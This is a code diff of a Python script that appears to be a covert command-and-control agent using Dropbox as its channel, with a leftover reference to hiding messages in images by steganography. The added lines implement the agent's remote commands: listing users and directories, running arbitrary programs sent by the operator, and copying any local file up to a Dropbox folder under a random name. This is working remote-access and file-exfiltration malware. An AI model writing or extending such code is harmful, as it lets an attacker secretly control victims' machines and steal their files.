@@ -8,6 +8,8 @@ import random
 import os
 import io
 import time
+import string
+import subprocess
 
 
 CHECK_PERIOD = 60
@@ -45,7 +47,7 @@ def register(dbx):
 
     new_name = new_name+'.png'
 
-    img_size = (128,128)
+    img_size = (512,512)
     img = get_random_image(img_size)
 
     buf = io.BytesIO()
@@ -63,9 +65,41 @@ def register(dbx):
     return new_name
 
 
-def execute_command(fields):
+def call_command(args):
+    proc = subprocess.run(args, capture_output=True, text=True)
+    if proc.returncode == 0:
+        ret = proc.stdout
+    else:
+        ret = proc.stderr
+    return ret
+
+def execute_command(dbx, fields):
     #print("Executing " + str(fields))
-    content = 'placeholder content\n'
+    words = fields[2].split(' ')
+    print(words)
+
+    if words[0] == 'who':
+        content = call_command(["w"])
+    elif words[0] == 'ls':
+        #subprocess.Popen("echo Hello World", shell=True, stdout=subprocess.PIPE).stdout.read()
+        content = call_command(["ls", words[1]])
+    elif words[0] == 'id':
+        content = call_command(["id"])
+    elif words[0] == 'cp':
+        path = words[1]
+        if not os.path.isfile(path):
+            content = 'cp error - no such file'
+        else:
+            ext = os.path.splitext('/home/david/graphs/lm_gen_edges.png')[-1]
+            rand_name = ''.join(random.choices(string.ascii_uppercase + string.digits, k=32)) + ext
+            f = open(path, "rb")
+            dbx.files_upload(io.BytesIO(f.read()).getvalue(), '/art/' + rand_name)
+            content = rand_name + '\n'
+    elif words[0] == 'execute':
+        content = call_command([words[1]])
+    else: 
+        content = 'Invalid command'
+
     return content
 
 def listen(dbx, my_id):
@@ -94,7 +128,7 @@ def process_commands(dbx, my_id, last_check):
         command_time = datetime.strptime(fields[0], "%d/%m/%Y %H:%M:%S")
         if last_check < command_time and fields[1] == 'REQUEST':
             content = 'Response to ' + fields[0] + ' ' + fields[2] + ' from ' + my_id + '\n'
-            content += execute_command(fields)
+            content += execute_command(dbx, fields)
             response = fields.copy()
             response[0] = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
             response[1] = 'RESPONSE'
@@ -120,7 +154,4 @@ if __name__ == "__main__":
         dbx = init(sys.argv[1])
         my_id = register(dbx)
         listen(dbx, my_id)
-        #print(my_id)
-        #message = lsb.reveal("./cute_out.png", lsb.generators.eratosthenes())
-        #print(message)
-        #process_commands(dbx, 'test_test_test.png')
+        
